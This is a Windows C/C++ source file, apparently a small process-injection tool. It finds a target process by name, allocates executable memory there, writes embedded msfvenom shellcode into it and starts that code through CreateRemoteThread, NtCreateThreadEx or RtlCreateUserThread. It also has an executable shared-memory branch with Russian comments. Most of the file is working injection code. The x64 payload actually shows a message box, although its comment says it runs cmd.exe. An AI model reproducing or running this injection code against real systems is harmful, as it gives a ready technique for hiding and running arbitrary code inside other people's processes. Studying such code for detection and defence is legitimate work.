#include "stdafx.h"
#include "general.h"
#include <psapi.h>
#include <stdio.h>
#include <Windows.h>

#ifdef _X86_
typedef DWORD(WINAPI *prototype_NtCreateThreadEx)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN DWORD StackZeroBits,
	IN DWORD SizeOfStackCommit,
	IN DWORD SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
	);

//msfvenom -a x86 --platform windows -p windows/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char sc[] = 
"\xeb\x27\x5b\x53\x5f\xb0\xf2\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\xe8\xa0\x74\x07\x80\x3e\xf2\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x0f\xf2\xd6\xe4\x94\xd6\x7b\x2b\xfb\x3e"
"\xdd\xbd\x78\x3e\xc6\x6b\x84\x7e\x3f\x84\x79\x03\x84\x79"
"\x13\x84\x49\x07\x84\x71\x2f\x84\x39\x37\x40\x17\x7a\xfc"
"\x56\x0e\xde\xf0\xee\x6f\x84\x63\x2b\x2b\x84\x4a\x33\x84"
"\x5b\x27\x77\x0e\xe5\x84\x45\x17\x84\x55\x2f\x0e\xe4\xec"
"\x3b\x46\x84\x3b\x84\x0e\xe1\x3e\xf0\x3e\xcf\xf3\xa3\x8b"
"\xcf\x7b\x08\xce\xc0\x02\x0e\xc8\xe4\xfb\x34\x73\x2b\x27"
"\x7a\xee\x84\x55\x2b\x0e\xe4\x69\x84\x03\x44\x84\x55\x13"
"\x0e\xe4\x84\x0b\x84\x0e\xe7\x86\x4b\x2b\x13\x6e\xcc\xbd"
"\x07\x26\xdb\x86\xea\x86\xcd\x67\x81\x41\x01\xe3\x5d\xe7"
"\x90\xf0\xf0\xf0\x86\x4a\x0b\xb4\xe0\xc1\xef\x6f\x88\x13"
"\x2b\x5d\xe7\x81\xf0\xf0\xf0\x86\x4a\x07\x67\x63\x63\x2f"
"\x4e\x67\x3c\x3d\x21\x6b\x67\x7a\x7c\x6a\x7d\x3f\xd4\x87"
"\x53\x2b\x05\x86\xe9\x59\xf0\x5a\x0b\x86\xcd\x5f\xb4\xa7"
"\xad\x42\xb3\x88\x13\x2b\x5d\xe7\x50\xf0\xf0\xf0\x67\x6a"
"\x57\x2f\x2f\x67\x7c\x7c\x6e\x68\x67\x6a\x2f\x62\x6a\x67"
"\x63\x6c\x60\x6b\x67\x5c\x67\x6a\x63\x3e\xd4\x87\x53\x2b"
"\x1e\x86\xec\x67\x57\x2f\x2f\x2f\x67\x6c\x60\x6b\x6a\x67"
"\x67\x6a\x63\x63\x67\x60\x62\x2f\x7c\x67\x60\x2f\x69\x7d"
"\x67\x47\x6a\x63\x63\x3e\xc6\x87\x43\x2b\x1b\x86\xee\x3e"
"\xdd\x5d\x5c\x5e\x5d\xf0\xdf\x3e\xcf\x5f\xf0\x5a\x07\xe8"
"\xa0";

#endif

#ifdef _WIN64
typedef DWORD(WINAPI *prototype_NtCreateThreadEx)(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ LPVOID ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
	);

//msfvenom -a x64 --platform windows -p windows/x64/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char sc[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x4a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x30\x00\x00\x00\x3e\x48\x8d\x95\x2a\x01\x00"
"\x00\x3e\x4c\x8d\x85\x3f\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6"
"\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80"
"\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
"\xda\xff\xd5\x48\x65\x6c\x6c\x6f\x20\x66\x72\x6f\x6d\x20"
"\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x00\x4d\x65\x73\x73"
"\x61\x67\x65\x42\x6f\x78\x00\x75\x73\x65\x72\x33\x32\x2e"
"\x64\x6c\x6c\x00";
#endif

typedef NTSTATUS(__stdcall* fnRtlIpv4StringToAddressA) (PCSTR S, BOOLEAN Strict, PCSTR* Terminator, in_addr* Addr);

typedef DWORD(WINAPI *prototype_RtlCreateUserThread)(
	HANDLE      ProcessHandle,
	PSECURITY_DESCRIPTOR  SecurityDescriptor,
	BOOL      CreateSuspended,
	ULONG     StackZeroBits,
	PULONG     StackReserved,
	PULONG     StackCommit,
	LPVOID     StartAddress,
	LPVOID     StartParameter,
	HANDLE      ThreadHandle,
	LPVOID     ClientID
	);

int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{
	if (argc != 3)
	{
		HANDLE hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, 1024, L"SharedMemory");
		if (hMapFile == NULL)
		{
			DWORD err = GetLastError();
			printf("Error code: %d\n", err);
			return 1;
		}
		printf("FileMapping created\n");


		// Проецирование разделяемой памяти в адресное пространство текущего процесса
		LPVOID pBuf = MapViewOfFile(hMapFile, /*FILE_MAP_ALL_ACCESS | */ FILE_MAP_EXECUTE | FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 1024);
		if (pBuf == NULL) {
			DWORD err = GetLastError();
			printf("Error code: %d\n", err);
			CloseHandle(hMapFile);
			return 1;
		}

		// Копирование шеллкода в разделяемую память
		// Здесь должен быть ваш шеллкод
		CopyMemory(pBuf, sc, sizeof(sc));

		/*
		DWORD processID = 32892;
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);

		// Определение адреса функции и выделение памяти в целевом процессе
		// ...

		// Создание удалённого потока для вызова функции
		//LPVOID pRemoteThreadStart = /* адрес функции RtlIpv4StringToAddressA в целевом процессе */;
		//LPVOID pRemoteParams = /* адрес параметров в целевом процессе */;
		/*
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
			(LPTHREAD_START_ROUTINE)pRemoteThreadStart,
			pRemoteParams, 0, NULL);

		// Ожидание завершения потока и освобождение ресурсов
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		VirtualFreeEx(hProcess, pRemoteParams, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		*/

		// Ожидание, чтобы второй процесс мог выполнить шеллкод
		getchar();

		// Освобождение ресурсов
		UnmapViewOfFile(pBuf);
		CloseHandle(hMapFile);

		printf("Usage: SimpleThreadInjection.exe [process name] [option number]\noption 1 - CreateRemoteThread\noption 2 - NtCreateThreadEx\noption 3 - RtlCreateUserThread\n");
		return -1;
	}

	int option = _wtoi(argv[2]);
	if (option != 1 && option != 2 && option != 3)
	{
		printf("[-] Wrong option number\n");
		ExitProcess(-1);
	}

	//find the process ID by name
	DWORD pid = FindPIDByName(argv[1]);
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);

	//open process with all access
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		//printf("[-] Couldn't open process, exiting...\n");
		//return -1;
		ErrorExit(TEXT("OpenProcess"));
	}
	printf("[+] Process handle: 0x%x\n", (UINT)hProcess);

	//allocate memory in target process
	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
	printf("[+] Allocated memory address in target process is: 0x%Ix\n", (SIZE_T)lpBaseAddress);


	//write SC to target process
	SIZE_T *lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)sc, sizeof(sc), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Shellcode is written to memory of target process\n");


	//start remote thread in target process
	HANDLE hThread = NULL;
	DWORD ThreadId = 0;

	switch (option)
	{
		//option 1: CreateRemoteThread
	case 1:
	{
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, (LPDWORD)(&ThreadId));
		if (hThread == NULL)
		{
			ErrorExit(TEXT("CreateRemoteThread"));
		}
		break;
	}
	//option 2: NtCreateThreadEx
	case 2:
	{
		prototype_NtCreateThreadEx pfnNtCreateThreadEx = NULL;
		GetFunctionAddressFromDll("ntdll.dll", "NtCreateThreadEx", (PVOID *)&pfnNtCreateThreadEx);

		pfnNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, NULL, NULL, NULL, NULL, NULL);
		if (hThread == NULL)
		{
			ErrorExit(TEXT("NtCreateThreadEx"));
		}
		break;
	}
	//option 3: RtlCreateUserThread
	case 3:
	{
		prototype_RtlCreateUserThread pfnRtlCreateUserThread = NULL;
		GetFunctionAddressFromDll("ntdll.dll", "RtlCreateUserThread", (PVOID *)&pfnRtlCreateUserThread);

		pfnRtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, lpBaseAddress, NULL, &hThread, NULL);
		if (hThread == NULL)
		{
			ErrorExit(TEXT("RtlCreateUserThread"));
		}
		break;
	}
	}

	printf("[+] Successfully started SC in target process\n");

	return 0;
}

